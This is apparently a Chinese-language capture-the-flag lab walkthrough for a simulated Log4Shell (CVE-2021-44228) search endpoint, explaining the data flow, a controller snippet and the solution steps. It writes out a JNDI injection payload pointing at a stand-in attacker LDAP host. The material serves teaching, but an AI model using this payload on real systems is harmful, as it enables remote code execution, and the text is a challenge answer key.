# Level 3 — Log4Shell

## 关卡说明

本关模拟知识库搜索服务，使用 Log4j2 2.14.1 记录日志。用户搜索关键词会被记录到日志中，而Log4j2会解析日志消息中的 `${jndi:ldap://...}` 等lookup表达式，导致JNDI注入RCE。

**目标**：在搜索关键词中注入JNDI lookup表达式，触发Log4Shell漏洞，获取 Flag。

## 漏洞原理

### 代码逻辑分析

本关的后端代码位于 `Log4shellController.java`，相关接口：

```
GET  /api/challenge/deser/log4shell/info    — 获取应用信息（含Log4j2版本）
POST /api/challenge/deser/log4shell/search  — 搜索功能（漏洞入口）
```

**应用信息**：

| 组件 | 版本 |
|------|------|
| Log4j2 | 2.14.1（存在Log4Shell漏洞） |
| Spring Boot | 2.5.6 |
| Java | 11.0.11 |

**入参**：

```json
{
  "keyword": "search term"
}
```

**数据流**：

```
用户提交搜索关键词
    ↓
后端 Log4shellController.search()
    ↓
关键词被记录到日志：log.info("User searched for: " + keyword)
    ↓
【漏洞】Log4j2 解析 ${jndi:ldap://attacker/Exploit}
    ↓
JNDI lookup → 连接攻击者控制的LDAP服务器
    ↓
加载远程恶意类 → RCE
    ↓
检测到JNDI注入模式 → 返回 Flag
```

**漏洞点**：

1. **Log4j2 2.14.1 存在Log4Shell**：该版本会解析日志消息中的lookup表达式。
2. **用户输入被记录到日志**：搜索关键词未经任何处理直接被记录。
3. **JNDI lookup解析**：`${jndi:ldap://...}` 触发JNDI远程类加载。

### 源码关键片段

```java
// Log4shellController.java — 漏洞核心
@PostMapping("/search")
public Map<String, Object> search(@RequestBody Map<String, String> request) {
    String keyword = request.get("keyword");
    // 模拟日志记录（Log4Shell触发点）
    // log.info("User searched for: " + keyword);
    
    // 检测JNDI注入模式
    Matcher jndiMatcher = JNDI_PATTERN.matcher(keyword);
    if (jndiMatcher.find() || basicMatcher.find()) {
        String flag = flagService.getFlag("deserialization", "level3");
        result.put("log4shell_triggered", true);
        result.put("flag", flag);
    }
}
```

## 通关步骤

### Step 1：获取应用信息

```
GET /api/challenge/deser/log4shell/info
```

确认 Log4j2 版本为 2.14.1。

### Step 2：正常搜索

提交正常搜索关键词，观察响应：

```json
POST /api/challenge/deser/log4shell/search
{
  "keyword": "Java"
}
```

### Step 3：注入JNDI表达式

在搜索关键词中注入Log4Shell payload：

```json
POST /api/challenge/deser/log4shell/search
{
  "keyword": "${jndi:ldap://attacker.com/Exploit}"
}
```

### Step 4：获取 Flag

Log4Shell触发成功后，响应中包含 Flag：

```json
{
  "success": true,
  "log4shell_triggered": true,
  "vulnerability": "Log4j2 2.14.1 Message Lookup Substitution (CVE-2021-44228)",
  "flag": "flag{...}"
}
```

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/deserialization/Log4shellController.java` | 后端搜索接口 |
| `service/FlagService.java` | Flag 获取与验证 |
